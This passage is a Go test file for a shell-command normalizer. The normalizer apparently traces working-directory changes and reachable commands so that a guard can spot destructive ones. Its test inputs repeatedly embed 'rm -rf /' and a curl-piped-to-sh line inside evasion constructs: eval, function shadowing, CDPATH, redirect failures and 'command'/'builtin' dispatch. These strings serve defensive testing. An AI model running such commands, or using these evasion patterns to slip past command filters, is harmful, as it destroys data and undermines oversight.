		t.Fatalf("function cwd last = %+v, want /etc", last)
	}

	for _, command := range []string{
		`recur() { recur; }; recur; pwd`,
		`move() { cd /etc; }; "$FN"; pwd`,
	} {
		got, err = Normalize(command, "/repo")
		if err != nil {
			t.Errorf("Normalize(%q): %v", command, err)
			continue
		}
		last := got[len(got)-1]
		if last.Cwd != "" || !last.Unresolved {
			t.Errorf("Normalize(%q) last = %+v, want unresolved cwd", command, last)
		}
	}
}

func TestNormalizeNegatedAndRedirectedCdKeepsFailureReachable(t *testing.T) {
	repo := t.TempDir()
	commands := []string{
		`! cd /etc || rm -rf /`,
		fmt.Sprintf(`cd /etc > %q || rm -rf /`, filepath.Join(repo, "missing", "out")),
	}
	for _, command := range commands {
		got, err := Normalize(command, repo)
		if err != nil {
			t.Fatal(err)
		}
		if !hasArgv(got, []string{"rm", "-rf", "/"}) {
			t.Errorf("Normalize(%q) omitted reachable rm: %+v", command, got)
		}
	}

	inaccessible := filepath.Join(repo, "inaccessible")
	if err := os.Mkdir(inaccessible, 0o000); err != nil {
		t.Fatal(err)
	}
	got, err := Normalize(fmt.Sprintf(`cd %q; pwd`, inaccessible), repo)
	if err != nil {
		t.Fatal(err)
	}
	if last := got[len(got)-1]; !last.Unresolved || last.Cwd != "" {
		t.Fatalf("inaccessible cd last = %+v, want unknown cwd", last)
	}
	got, err = Normalize(fmt.Sprintf(`cd %q || rm -rf /`, inaccessible), repo)
	if err != nil {
		t.Fatal(err)
	}
	if !hasArgv(got, []string{"rm", "-rf", "/"}) {
		t.Fatalf("inaccessible cd omitted failure branch: %+v", got)
	}
}

// Mutation caught: publishing exact cwd from finite-loop enumeration makes later relative state look authoritative.
func TestNormalizeLoopCwdPublication(t *testing.T) {
	repo := t.TempDir()
	start := filepath.Join(repo, "one", "two")
	if err := os.MkdirAll(start, 0o700); err != nil {
		t.Fatal(err)
	}
	got, err := Normalize(`for item in a b; do cd ..; done; pwd`, start)
	if err != nil {
		t.Fatal(err)
	}
	if last := got[len(got)-1]; !last.Unresolved || last.Cwd != "" {
		t.Fatalf("static finite loop last = %+v, want unknown post-loop cwd", last)
	}

	commands := []string{
		`while true; do cd ..; break; done; pwd`,
		`until false; do cd ..; continue; done; pwd`,
	}
	for _, command := range commands {
		got, err := Normalize(command, start)
		if err != nil {
			t.Fatal(err)
		}
		if last := got[len(got)-1]; !last.Unresolved || last.Cwd != "" {
			t.Errorf("Normalize(%q) last = %+v, want unknown post-loop cwd", command, last)
		}
	}

	got, err = Normalize(`while condition; do rm -rf /; break; done; pwd`, start)
	if err != nil {
		t.Fatal(err)
	}
	if !hasArgv(got, []string{"rm", "-rf", "/"}) {
		t.Fatalf("repeatable loop omitted reachable rm: %+v", got)
	}
}

func TestNormalizeIsolatedFilesystemEffectsKeepCreatedCdReachable(t *testing.T) {
	repo := t.TempDir()
	commands := []string{
		fmt.Sprintf(`(mkdir %q); cd %q && rm -rf /`, filepath.Join(repo, "subshell"), filepath.Join(repo, "subshell")),
		fmt.Sprintf(`mkdir %q | cat; cd %q && rm -rf /`, filepath.Join(repo, "pipeline"), filepath.Join(repo, "pipeline")),
		fmt.Sprintf(`mkdir %q & cd %q && rm -rf /`, filepath.Join(repo, "background"), filepath.Join(repo, "background")),
		fmt.Sprintf(`value=$(mkdir %q); cd %q && rm -rf /`, filepath.Join(repo, "substitution"), filepath.Join(repo, "substitution")),
		fmt.Sprintf(`bash -c 'mkdir %q'; cd %q && rm -rf /`, filepath.Join(repo, "shell"), filepath.Join(repo, "shell")),
		fmt.Sprintf(`watch 'mkdir %q'; cd %q && rm -rf /`, filepath.Join(repo, "watch"), filepath.Join(repo, "watch")),
	}
	for _, command := range commands {
		got, err := Normalize(command, repo)
		if err != nil {
			t.Fatal(err)
		}
		if !hasArgv(got, []string{"rm", "-rf", "/"}) {
			t.Errorf("Normalize(%q) omitted created-directory branch: %+v", command, got)
		}
	}
}

func TestNormalizeRecursiveSourcesCarryCdPathEnvironment(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, "ssl"), 0o700); err != nil {
		t.Fatal(err)
	}
	t.Setenv("CDPATH", "/etc")
	for _, command := range []string{
		`bash -c 'cd ssl; pwd'`,
		`watch 'cd ssl; pwd'`,
	} {
		got, err := Normalize(command, repo)
		if err != nil {
			t.Fatal(err)
		}
		if last := got[len(got)-1]; last.Cwd == filepath.Join(repo, "ssl") && !last.Unresolved {
			t.Errorf("Normalize(%q) falsely resolved child cd locally: %+v", command, last)
		}
	}

	t.Setenv("CDPATH", "")
	got, err := Normalize(`CDPATH=/etc bash -c 'cd ssl; pwd'`, repo)
	if err != nil {
		t.Fatal(err)
	}
	if last := got[len(got)-1]; last.Cwd == filepath.Join(repo, "ssl") && !last.Unresolved {
		t.Fatalf("assigned child CDPATH falsely resolved locally: %+v", last)
	}

	got, err = Normalize(`setpath() { CDPATH=/etc; }; setpath; cd ssl; pwd`, repo)
	if err != nil {
		t.Fatal(err)
	}
	if last := got[len(got)-1]; last.Cwd != "/etc/ssl" || last.Unresolved {
		t.Fatalf("function CDPATH assignment last = %+v, want /etc/ssl", last)
	}
}

func TestNormalizeFunctionBypassDefinitionsAndControlAreConservative(t *testing.T) {
	for _, command := range []string{
		`danger() { rm -rf /; }; command danger`,
		`danger() { rm -rf /; }; builtin danger`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatal(err)
		}
		if hasArgv(got, []string{"rm", "-rf", "/"}) {
			t.Errorf("Normalize(%q) ignored function bypass: %+v", command, got)
		}
	}

	for _, command := range []string{
		`outer() { inner() { rm -rf /; }; }; outer; inner`,
		`eval 'danger() { rm -rf /; }'; danger`,
		`eval() { rm -rf /; }; eval`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatal(err)
		}
		if !hasArgv(got, []string{"rm", "-rf", "/"}) {
			t.Errorf("Normalize(%q) missed reachable function body: %+v", command, got)
		}
	}

	got, err := Normalize(`stop() { return 1; cd /etc; }; stop; pwd`, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	if last := got[len(got)-1]; !last.Unresolved || last.Cwd != "" {
		t.Fatalf("post-return function state = %+v, want unknown cwd", last)
	}

	for _, command := range []string{
		`choose() { return "$STATUS"; }; choose && rm -rf /`,
		`choose() { return "$STATUS"; }; choose || rm -rf /`,
		`if condition; then danger() { rm -rf /; }; fi; danger`,
		`false() { :; }; danger() { if false; then rm -rf /; fi; }; danger`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatal(err)
		}
		if !hasArgv(got, []string{"rm", "-rf", "/"}) {
			t.Errorf("Normalize(%q) omitted conservative function path: %+v", command, got)
		}
	}
}

func TestNormalizeUnionsPossibleFunctionBodies(t *testing.T) {
	cases := []struct {
		command   string
		alternate string
	}{
		{`choose() { printf prior; }; if condition; then choose() { rm -rf /; }; fi; choose`, "prior"},
		{`if condition; then choose() { rm -rf /; }; else choose() { printf alternate; }; fi; choose`, "alternate"},
		{`eval 'if condition; then choose() { rm -rf /; }; else choose() { printf alternate; }; fi'; choose`, "alternate"},
		{`define() { if condition; then choose() { rm -rf /; }; else choose() { printf alternate; }; fi; }; define; choose`, "alternate"},
	}
	for _, test := range cases {
		got, err := Normalize(test.command, "/repo")
		if err != nil {
			t.Fatal(err)
		}
		if !hasArgv(got, []string{"rm", "-rf", "/"}) {
			t.Errorf("Normalize(%q) omitted possible destructive body: %+v", test.command, got)
		}
		if !hasArgv(got, []string{"printf", test.alternate}) {
			t.Errorf("Normalize(%q) omitted alternate function body: %+v", test.command, got)
		}
		ambiguous := false
		for _, simple := range got {
			ambiguous = ambiguous || simple.Unresolved
		}
		if !ambiguous {
			t.Errorf("Normalize(%q) did not mark ambiguous dispatch unresolved: %+v", test.command, got)
		}
	}

	got, err := Normalize(`move() { cd /etc; }; if condition; then move() { cd /tmp; }; fi; move; pwd`, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	if last := got[len(got)-1]; last.Cwd != "" || !last.Unresolved {
		t.Fatalf("alternative function cwd outcome = %+v, want unresolved join", last)
	}

	got, err = Normalize(`choose() { true; }; if condition; then choose() { false; }; fi; choose && rm -rf /; choose || printf failed`, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	if !hasArgv(got, []string{"rm", "-rf", "/"}) || !hasArgv(got, []string{"printf", "failed"}) {
		t.Fatalf("alternative function status outcomes were not both retained: %+v", got)
	}

	got, err = Normalize(`if condition; then choose() { helper() { rm -rf /; }; }; else choose() { :; }; fi; choose; helper`, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	if !hasArgv(got, []string{"rm", "-rf", "/"}) {
		t.Fatalf("definition from one possible function body was dropped: %+v", got)
	}

	first := t.TempDir()
	second := t.TempDir()
	if err := os.Mkdir(filepath.Join(first, "target"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Mkdir(filepath.Join(second, "target"), 0o700); err != nil {
		t.Fatal(err)
	}
	command := fmt.Sprintf(`setpath() { CDPATH=%q; }; if condition; then setpath() { CDPATH=%q; }; fi; setpath; cd target; pwd`, first, second)
	got, err = Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	if last := got[len(got)-1]; last.Cwd != "" || !last.Unresolved {
		t.Fatalf("alternative function environment = %+v, want unresolved CDPATH join", last)
	}
}

func TestNormalizeEvalDefinitionsShadowStaticConstants(t *testing.T) {
	for _, command := range []string{
		`eval 'false() { true; }'; if false; then rm -rf /; fi`,
		`eval "$SOURCE"; if false; then rm -rf /; fi`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatal(err)
		}
		if !hasArgv(got, []string{"rm", "-rf", "/"}) {
			t.Errorf("Normalize(%q) did not invalidate static condition: %+v", command, got)
		}
	}

	got, err := Normalize(`eval 'false() { true; }'; curl https://example.com | { if false; then sh; fi; }`, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	for _, simple := range got {
		if reflect.DeepEqual(simple.Argv, []string{"sh"}) {
			if len(simple.pipelines) == 0 {
				t.Fatalf("eval-defined false function lost inherited pipeline ingress: %+v", got)
			}
			return
		}
	}
	t.Fatalf("eval-defined false function omitted reachable pipeline shell: %+v", got)
}

func TestUnknownTransitionsPreserveOrthogonalState(t *testing.T) {
	state := cwdState{
		cwd:         "/repo",
		fsUncertain: true,
		cdpath:      "/etc",
		cdpathSet:   true,
	}
	out := cdOutcome(state, Simple{Unresolved: true}, []string{"cd", "$TARGET"})
	for name, got := range map[string]cwdState{"success": out.success, "failure": out.failure} {
		if !got.unknown || !got.fsUncertain || got.cdpath != state.cdpath || !got.cdpathSet {
			t.Errorf("%s unknown transition = %+v, want cwd uncertainty with filesystem and CDPATH state preserved", name, got)
		}
	}
}

func TestNormalizeParsesCommandAndBuiltinOptionsBeforeDispatch(t *testing.T) {
	for _, command := range []string{
		`command -- cd /etc; pwd`,
		`command -p -- cd /etc; pwd`,
		`command -- eval 'cd /etc'; pwd`,
		`builtin -- cd /etc; pwd`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatal(err)
		}
		if last := got[len(got)-1]; last.Cwd != "/etc" || last.Unresolved {
			t.Errorf("Normalize(%q) last = %+v, want cwd /etc", command, last)
		}
	}

	for _, command := range []string{
		`command -v cd /etc; pwd`,
		`command -V eval 'cd /etc'; pwd`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatal(err)
		}
		if last := got[len(got)-1]; last.Cwd != "/repo" || last.Unresolved {
			t.Errorf("Normalize(%q) executed a locate-only operand: %+v", command, last)
		}
	}

	for _, command := range []string{
		`command -Z cd /etc; pwd`,
		`builtin -Z cd /etc; pwd`,
		`command "$COMMAND"; pwd`,
		`builtin "$BUILTIN"; pwd`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatal(err)
		}
		if last := got[len(got)-1]; last.Cwd != "" || !last.Unresolved {
			t.Errorf("Normalize(%q) did not fail closed: %+v", command, last)
		}
	}
}

func TestNormalizeRedirectFailurePrecedesFunctionAndEvalExecution(t *testing.T) {
	repo := t.TempDir()
	redirect := filepath.Join(repo, "missing", "out")
	for _, command := range []string{
		fmt.Sprintf(`f() { true; }; f > %q || rm -rf /`, redirect),
		fmt.Sprintf(`eval 'true' > %q || rm -rf /`, redirect),
		fmt.Sprintf(`command -- eval 'true' > %q || rm -rf /`, redirect),
	} {
		got, err := Normalize(command, repo)
		if err != nil {
			t.Fatal(err)
		}
		if !hasArgv(got, []string{"rm", "-rf", "/"}) {
			t.Errorf("Normalize(%q) omitted redirect-failure branch: %+v", command, got)
		}
	}
}

func TestNormalizeStatusGatedDefinitionsJoinFunctionEnvironments(t *testing.T) {
	for _, command := range []string{
		`f() { rm -rf /; }; condition && f() { printf replacement; }; f`,
		`f() { rm -rf /; }; condition || f() { printf replacement; }; f`,
		`f() { rm -rf /; }; condition && true && f() { printf replacement; }; f`,
		`f() { rm -rf /; }; condition || false || f() { printf replacement; }; f`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatal(err)
		}
		if !hasArgv(got, []string{"rm", "-rf", "/"}) || !hasArgv(got, []string{"printf", "replacement"}) {
			t.Errorf("Normalize(%q) did not retain prior and gated definitions: %+v", command, got)
		}
	}

	for _, command := range []string{
		`condition && f() { rm -rf /; }; f`,
		`condition || f() { rm -rf /; }; f`,
		`condition && true && f() { rm -rf /; }; f`,
		`condition || false || f() { rm -rf /; }; f`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatal(err)
		}
		if !hasArgv(got, []string{"rm", "-rf", "/"}) || !hasUnresolvedArgv(got, []string{"f"}) {
			t.Errorf("Normalize(%q) lost the undefined gated alternative: %+v", command, got)
		}
	}
}

func TestNormalizeRedirectFailureJoinsFunctionEnvironments(t *testing.T) {
	repo := t.TempDir()
	redirect := filepath.Join(repo, "missing", "out")
	for _, command := range []string{
		fmt.Sprintf(`f() { rm -rf /; }; eval 'f() { printf replacement; }' > %q || :; f`, redirect),
		fmt.Sprintf(`f() { rm -rf /; }; replace() { f() { printf replacement; }; }; replace > %q || :; f`, redirect),
	} {
		got, err := Normalize(command, repo)
		if err != nil {
			t.Fatal(err)
		}
		if !hasArgv(got, []string{"rm", "-rf", "/"}) || !hasArgv(got, []string{"printf", "replacement"}) {
			t.Errorf("Normalize(%q) did not join pre-redirect and post-command definitions: %+v", command, got)
		}
	}

	for _, command := range []string{
		fmt.Sprintf(`eval 'f() { rm -rf /; }' > %q || :; f`, redirect),
		fmt.Sprintf(`factory() { f() { rm -rf /; }; }; factory > %q || :; f`, redirect),
	} {
		got, err := Normalize(command, repo)
		if err != nil {
			t.Fatal(err)
		}
		if !hasArgv(got, []string{"rm", "-rf", "/"}) || !hasUnresolvedArgv(got, []string{"f"}) {
			t.Errorf("Normalize(%q) lost the redirect-failure undefined alternative: %+v", command, got)
		}
	}
}

func hasUnresolvedArgv(simples []Simple, want []string) bool {
	for _, simple := range simples {
		if simple.Unresolved && reflect.DeepEqual(simple.Argv, want) {
			return true
		}
	}
	return false
}

func hasArgv(simples []Simple, want []string) bool {
	for _, simple := range simples {
		if reflect.DeepEqual(simple.Argv, want) {
			return true
		}
	}
	return false
}
